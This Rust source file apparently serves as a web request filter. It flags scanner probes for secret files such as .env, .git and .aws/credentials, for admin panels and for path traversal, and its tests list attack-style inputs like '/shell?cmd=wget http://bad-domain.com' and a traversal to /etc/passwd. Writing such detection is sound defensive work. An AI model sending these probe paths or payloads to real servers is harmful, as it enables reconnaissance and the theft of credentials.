// LEGACY REGEX
// static BAD_PATH_REGEX: LazyLock<RegexSet> = LazyLock::new(|| {
//     RegexSet::new(&[
//         r"(?i)/\.env(\.[A-Za-z0-9_-]+)?(\b|/|\?)",
//         r"(?i)^/(\.config)\b",
//         r"(?i)^/config\.json\b",
//         r"(?i)^/(?:config|web)\.xml\b",
//         r"(?i)^/actuator(/|$)",
//         r"(?i)^/boaform(/|$)",
//         r"(?i)^/zabbix(/|$)",
//         r"(?i)^/druid(/|$)",
//         r"(?i)^/jasperserver(/|$)",
//         r"(?i)^/partymgr(/|$)",
//         r"(?i)^/admin(/|$)",
//         r"(?i)^/developmentserver(/|$)",
//         r"(?i)^/phpmyadmin(/|$)",
//         r"(?i)^/wordpress(/|$)",
//         r"(?i)^/telescope(/|$)",
//         r"(?i)^/\+CSCOE\+(/|$)",
//         r"(?i)^/console(/|$)",
//         r"(?i)^/geoserver(/|$)",
//         r"(?i)^/service/api-docs(/|$)",
//         r"(?i)^/goform(/|$)",
//         r"(?i)^/_profiler(/|$)",
//         r"(?i)^/_ignition(/|$)",
//         r"(?i)^/cgi-bin(/|$)",
//         r"(?i)^/wp-[^/\s]+",
//         r"(?i)^/solr",
//         r"(?i)/\.git(|ignore|config|modules)(\.[A-Za-z0-9_-]+)?(\b|/|$)",
//         r"(?i)^/shell\?",
//         r"(?i)^/query\?",
//         r"(?i)\?XDEBUG_SESSION_START=",
//         r"(?i)\.(php[0-9]*|env|zip|tar|gz|tgz|rar|bak|jar|old|save|example|db|sqlite3?|ini|yaml|yml|cfg|conf|rsp|aspx|asp[0-9]*|jsp[0-9]*|cgi|xml)(\b|/|\?|$)",
//         r"(?i)^/(?:vendor|storage|config|resources|public)/.*\.(env|php|ini|yaml|yml|cfg|conf)(\b|/|\?|$)",
//         r"(?i)^/(?:env|php|cgi|shell|config|backup|backups)(/|$)",
//         r"\.\./",
//         r"(?i)^/\.(aws|docker|envrc|envs|local|production|remote|ssh|vscode)(/|$)",
//         r"(?i)^/\.(aws|docker|ssh|vscode)/.*\.json(\b|/|\?|$)",
//         r"(?i)^/(?:sftp-config\.json|sftp\.json)$",
//         r"(?i)^/.+\b/sftp-config\.json$",
//         r"(?i)^/.+\b/sftp\.json$",
//         r"(?i)^/(private|prevlaravel|src/config|src)/.*\.(json|env|yaml|yml|ini|cfg|conf)(\b|/|\?|$)",
//         r"(?i)^/tsconfig(\.[A-Za-z0-9_-]+)?\.json(\b|/|\?|$)",
//     ])
//     .unwrap()
// });

const BAD_PREFIXES: &[&str] = &[
    "/actuator",
    "/boaform",
    "/zabbix",
    "/druid",
    "/jasperserver",
    "/partymgr",
    "/admin",
    "/developmentserver",
    "/phpmyadmin",
    "/wordpress",
    "/telescope",
    "/+cscoe+",
    "/console",
    "/geoserver",
    "/service/api-docs",
    "/goform",
    "/_profiler",
    "/_ignition",
    "/cgi-bin",
    "/solr",
    "/vendor",
    "/storage",
    "/config",
    "/resources",
    "/public",
    "/env",
    "/php",
    "/cgi",
    "/shell",
    "/backup",
    "/backups",
    "/private",
    "/prevlaravel",
    "/src",
];

const BAD_EXT: &[&str] = &[
    ".php", ".php0", ".env", ".zip", ".tar", ".gz", ".tgz", ".rar", ".bak", ".jar", ".old",
    ".save", ".example", ".db", ".sqlite", ".sqlite3", ".ini", ".yaml", ".yml", ".cfg", ".conf",
    ".rsp", ".aspx", ".asp", ".jsp", ".cgi", ".xml",
];

const ROOT_DOT_FILES: &[&str] = &[
    "/.env",
    "/.config",
    "/.aws",
    "/.docker",
    "/.ssh",
    "/.vscode",
    "/.git",
    "/.local",
    "/.production",
    "/.remote",
];

pub fn is_bad_path(path: &str) -> bool {
    let p = path.to_ascii_lowercase();

    // Traversal
    if p.contains("../") {
        return true;
    }

    // WordPress patterns
    if p.starts_with("/wp-") {
        return true;
    }

    // Suspicious query flags
    if p.contains("?xdebug_session_start=") {
        return true;
    }

    // Sensitive dot files
    for file in ROOT_DOT_FILES {
        if p.starts_with(file) {
            return true;
        }
    }

    // Sensitive root files
    if p == "/config.json" || p == "/sftp-config.json" || p == "/sftp.json" {
        return true;
    }

    // tsconfig.*.json
    if p.starts_with("/tsconfig") && p.ends_with(".json") {
        return true;
    }

    for prefix in BAD_PREFIXES {
        if p.starts_with(prefix) {
            return true;
        }
    }

    // Shell/query execution attempts
    if p.starts_with("/shell?") || p.starts_with("/query?") {
        return true;
    }

    for ext in BAD_EXT {
        if p.ends_with(ext) || p.contains(&format!("{ext}?")) {
            return true;
        }
    }

    false
}

#[cfg(test)]
mod tests {
    use super::is_bad_path;

    #[test]
    fn test_bad_paths() {
        let bad_paths = [
            "/.env",
            "/.env.bak",
            "/beep/.env.bak",
            "/.config",
            "/config.json",
            "/test.php",
            "/test.php0",
            "/cgi-bin/ls",
            "/wp-admin/install.php",
            "/solr/select?q=*",
            "/.git/config",
            "/.git",
            "/shell?cmd=wget http://bad-domain.com",
            "/query?q=SELECT+*+FROM+users",
            "/service/api-docs",
            "/mail/.env.db",
            "/db/phpmyadmin/index.php?lang=en",
            "/?XDEBUG_SESSION_START=phpstorm",
            "/actuator/gateway/routes",
            "/console/",
            "/geoserver/wms",
            "/_ignition/health",
            "/.env.local",
            "/.env.old",
            "/.env.save",
            "/backup/.env",
            "/config/.env.production",
            "/.gitignore",
            "/.gitmodules",
            "/.git/config.bak",
            "/wp-login.php",
            "/wp-content/plugins/akismet/readme.txt",
            "/wordpress/wp-admin/",
            "/drupal/install.php",
            "/joomla/configuration.php",
            "/phpinfo.php",
            "/index.php?view=../../../../etc/passwd",
            "/uploads/shell.jsp",
            "/cgi-bin/test.cgi",
            "/_profiler/phpinfo",
            "/geoserver/web/",
            "/goform/formLogin",
            "/console/login.action",
            "/actuator/env",
            "/service/api-docs/swagger.json",
            "/query?cmd=id",
            "/shell?exec=ls",
            "/wp-content/uploads/.env",
            "/solr/admin/info/system",
            "/phpmyadmin/",
            "/vendor/.env",
            "/storage/.env.example",
            "/.aws/config",
            "/.aws/credentials",
            "/.docker/config.json",
            "/.envrc",
            "/.envs",
            "/.local",
            "/.production",
            "/.remote",
            "/.ssh/sftp-config.json",
            "/.vscode/settings.json",
            "/.vscode/sftp.json",
            "/prevlaravel/sftp-config.json",
            "/private/config.json",
            "/private/env.json",
            "/sftp-config.json",
            "/sftp.json",
            "/src/config/config.json",
            "/src/config/environment.json",
            "/src/settings.json",
            "/tsconfig.app.json",
            "/tsconfig.json",
            "/tsconfig.spec.json",
            "/boaform/admin",
            "/admin",
            "/developmentserver/metadatauploader",
            "/+CSCOE+/logon_forms.js",
        ];
        for p in bad_paths {
            assert!(is_bad_path(p), "Should match {p}");
        }
    }

    #[test]
    fn test_bad_paths_negative() {
        let good_paths = [
            "/static/css/main.css",
            "/images/logo.png",
            "/api/v1/users?id=2",
            "/search?q=php",
            "/foo.phpbiba",
        ];
        for p in good_paths {
            assert!(!is_bad_path(p), "Should not match {p}");
        }
    }
}
